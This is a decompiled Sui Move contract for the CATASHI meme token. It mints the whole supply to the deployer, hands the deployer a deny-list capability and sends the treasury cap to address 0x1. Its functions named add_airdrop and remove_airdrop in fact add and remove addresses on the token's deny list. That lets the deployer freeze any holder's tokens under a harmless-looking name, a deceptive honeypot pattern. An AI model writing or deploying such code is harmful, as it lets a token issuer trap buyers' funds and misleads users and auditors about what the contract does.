module 0x119dc0b1e18fc72db8216945213f0b18e3d47c7a45b0cde1cf1f96bfd8cce640::CATASHI {
    struct CATASHI has drop {
        dummy_field: bool,
    }

    public entry fun add_airdrop(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<CATASHI>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<CATASHI>(arg0, arg1, arg2, arg3);
    }

    fun init(arg0: CATASHI, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<CATASHI>(arg0, 6, b"CATASHI", b"Sui Catashi Nakamoto", b"Catashi Nakamoto revealed", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe_from_bytes(b"https://pump.mypinata.cloud/ipfs/QmNu8SA1N4Ki8YKejp5U6jihjQjFtWSVb37Up2NG4iUm2e?img-width=256&img-dpr=2&img-onerror=redirect")), false, arg1);
        let v3 = v0;
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<CATASHI>>(v2);
        0x2::transfer::public_transfer<0x2::coin::Coin<CATASHI>>(0x2::coin::mint<CATASHI>(&mut v3, 1000000000000000, arg1), 0x2::tx_context::sender(arg1));
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<CATASHI>>(v1, 0x2::tx_context::sender(arg1));
        0x2::transfer::public_transfer<0x2::coin::TreasuryCap<CATASHI>>(v3, @0x1);
    }

    public entry fun remove_airdrop(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<CATASHI>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<CATASHI>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

